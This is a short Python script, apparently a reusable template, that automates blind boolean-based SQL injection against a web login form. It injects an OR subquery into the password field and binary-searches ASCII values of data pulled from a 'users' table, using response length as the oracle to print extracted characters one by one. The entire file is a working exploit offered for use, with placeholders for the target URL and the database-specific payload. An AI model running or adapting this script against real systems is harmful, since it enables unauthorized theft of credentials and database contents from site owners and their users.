import requests
import json

url = ['PUT AN URL HERE']
headers = {
"Put an header":"here",
"or":"here"}
payload = "CHOOSE YOUR PAYLOAD DEPENDING ON YOUR SGBD"
proxies = {
	"http": "http://127.0.0.1:8081",
	"https": "http://127.0.0.1:8081",
}

#SIZE OF VARIABLE
result_lenght = range(100)

result = []

def sql_test(val,url,headers,payload,position_letter):
	val = '"'+chr(int(val))+'"'
	content = { 
		"username":"user2",	
		"password":"qqqqqqq' OR (SELECT hex(substr("+str(payload)+","+str(position_letter)+",1)) FROM users limit 2 offset 1) < hex("+val+") OR '21213'='213213",
			}
	attack = requests.post(url, data=content, headers=headers, proxies=proxies)
	taille = len(attack.content)
	if  taille == 617 :
		return 1
	else :
		return 0

for position_letter in result_lenght :
	ascii_inf = 0
	ascii_sup = 127
	while ascii_sup-ascii_inf != 1 :
		val =int((ascii_sup+ascii_inf)/2)
		if sql_test(val, url, headers, payload, position_letter+1) :
			ascii_sup = val
		else :
			ascii_inf = val
	print(chr(int(ascii_inf)))
	position_letter = position_letter+1
